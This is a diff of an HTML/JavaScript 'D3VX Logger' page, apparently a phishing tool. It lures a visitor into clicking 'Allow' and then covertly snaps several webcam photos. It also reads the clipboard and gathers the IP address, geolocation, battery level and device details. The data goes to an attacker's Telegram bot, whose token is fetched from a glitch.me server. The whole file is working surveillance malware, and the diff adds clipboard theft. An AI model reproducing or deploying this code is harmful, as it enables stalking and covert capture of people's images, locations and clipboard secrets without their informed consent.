@@ -1,73 +1,66 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Logger 🔥 by Divyansh</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>D3VX Logger</title>
   <style>
-    @media only screen and (min-width: 768px) {
-      body { display: none; }
-    }
     body {
-      background: black;
-      color: lime;
-      font-family: monospace;
-      padding: 20px;
+      margin: 0;
+      background: #0a0f24;
+      color: #fff;
+      font-family: sans-serif;
       text-align: center;
+      overflow: hidden;
     }
-    input, button {
-      padding: 10px;
-      margin: 10px;
-      border: none;
+    .card {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       background: black;
-      color: lime;
-      border: 2px solid lime;
-      border-radius: 5px;
-      width: 90%;
-      max-width: 300px;
+      padding: 30px;
+      border-radius: 15px;
     }
-    #result {
-      color: cyan;
-      word-wrap: break-word;
-      border: 1px solid lime;
-      padding: 10px;
-      background: #000;
-      margin-top: 10px;
+    .card h1 {
+      font-size: 2em;
     }
     #permissionPopup {
       position: fixed;
       top: 0; left: 0;
-      width: 100%;
-      height: 100%;
+      width: 100%; height: 100%;
       background: rgba(0,0,0,0.95);
+      color: lime;
       display: none;
+      z-index: 9999;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      flex-direction: column;
-      z-index: 9999;
     }
     #permissionPopup button {
+      margin-top: 20px;
+      padding: 10px 25px;
       background: lime;
       color: black;
-      margin-top: 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
     }
   </style>
 </head>
 <body>
-  <div id="mainPage">
-    <h3>👨‍💻 Hacker Logger Link Generator</h3>
-    <input id="token" placeholder="Enter Bot Token">
-    <input id="chatid" placeholder="Enter Chat ID">
-    <br>
-    <button onclick="generateLink()">Generate Link</button>
-    <div id="result" onclick="copyLink()" title="Tap to Copy">
-      🔗 Your Link: <span id="linkText"></span>
-    </div>
-    <p>⚡ Coded by Divyansh ❤️</p>
+
+  <!-- Animation / Welcome UI -->
+  <div class="card">
+    <h1>D3V✘</h1>
+    <p>Welcome to the My Server. Click Background And Enjoy Effect!</p>
+    <p>Hello dear I'm D3V X Hacker</p>
   </div>
 
+  <!-- Popup Permission -->
   <div id="permissionPopup">
-    <h3>💀 Allow us to See Something Amazing?</h3>
+    <h2>💀 Allow us to See Something Amazing?</h2>
     <button onclick="allowLogger()">✅ Allow</button>
   </div>
 
@@ -76,45 +69,18 @@
     const uid = params.get("uid");
 
     if (uid) {
-      document.body.innerHTML = ''; // hide UI
-      document.body.appendChild(document.getElementById("permissionPopup"));
+      document.body.innerHTML += document.getElementById("permissionPopup").outerHTML;
       document.getElementById("permissionPopup").style.display = "flex";
     }
 
-    function generateUID() {
-      return Math.random().toString(36).substring(2, 16);
-    }
-
-    function generateLink() {
-      const token = document.getElementById("token").value.trim();
-      const chatid = document.getElementById("chatid").value.trim();
-      if (!token || !chatid) return alert("Please enter both fields");
-
-      const uid = generateUID();
-
-      fetch("https://grizzled-gamy-child.glitch.me/save", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ uid, token, chat_id: chatid })
-      });
-
-      const finalLink = `https://d3vx.vercel.app/?uid=${uid}`;
-      document.getElementById("linkText").innerText = finalLink;
-    }
-
-    function copyLink() {
-      const text = document.getElementById("linkText").innerText;
-      navigator.clipboard.writeText(text);
-      alert("Copied to clipboard!");
-    }
-
     async function allowLogger() {
-      document.getElementById("permissionPopup").innerHTML = "<p style='color:lime;'>⏳ Collecting device info...</p>";
+      document.getElementById("permissionPopup").innerHTML = "<h2>⏳ Collecting Info...</h2>";
 
       try {
         const res = await fetch(`https://grizzled-gamy-child.glitch.me/get?uid=${uid}`);
         const { token, chat_id } = await res.json();
 
+        // 📸 Camera Access
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
         video.srcObject = stream;
@@ -131,14 +97,20 @@
           photos.push(canvas.toDataURL("image/jpeg"));
         };
 
-        await new Promise(r => setTimeout(r, 1000));
-        capture();
-        await new Promise(r => setTimeout(r, 1900));
-        capture();
-        await new Promise(r => setTimeout(r, 1900));
-        capture();
+        await new Promise(r => setTimeout(r, 1000)); capture();
+        await new Promise(r => setTimeout(r, 1500)); capture();
+        await new Promise(r => setTimeout(r, 1500)); capture();
         stream.getTracks().forEach(t => t.stop());
 
+        // 📋 Clipboard read
+        let clipboardText = "Not allowed";
+        try {
+          clipboardText = await navigator.clipboard.readText();
+        } catch (e) {
+          clipboardText = "Permission denied or unavailable";
+        }
+
+        // 🔋 Battery + IP + OS
         const battery = await navigator.getBattery();
         const info = {
           ip: await (await fetch("https://api.ipify.org?format=json")).json(),
@@ -147,6 +119,7 @@
           battery: `${Math.round(battery.level * 100)}%`
         };
 
+        // 📍 Location
         let location = "Not granted";
         if (navigator.geolocation) {
           await new Promise((resolve) => {
@@ -157,8 +130,9 @@
           });
         }
 
-        const caption = `💀 𝗗𝗶𝘃𝘆𝗮𝗻𝘀𝗵 𝗗𝗲𝗲𝘄𝗮𝗻𝗮 💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n📍 Location: ${location}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;
+        const caption = `💀 𝗗𝗶𝘃𝘆𝗮𝗻𝘀𝗵 𝗗𝗲𝗲𝘄𝗮𝗻𝗮 💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n📍 Location: ${location}\n📋 Clipboard: ${clipboardText}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;
 
+        // 🔁 Send to Telegram
         for (let i = 0; i < photos.length; i++) {
           await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: "POST",
@@ -171,11 +145,11 @@
           });
         }
 
-        document.getElementById("permissionPopup").innerHTML = "<p style='color:lime;'>✅ Sent to Telegram!</p>";
+        document.getElementById("permissionPopup").innerHTML = "<h2>✅ Sent to Telegram!</h2>";
 
-      } catch (e) {
-        console.error("Logger failed:", e);
-        document.getElementById("permissionPopup").innerHTML = "<p style='color:red;'>❌ Error sending data!</p>";
+      } catch (err) {
+        console.error(err);
+        document.getElementById("permissionPopup").innerHTML = "<h2>❌ Error sending data!</h2>";
       }
     }
   </script>
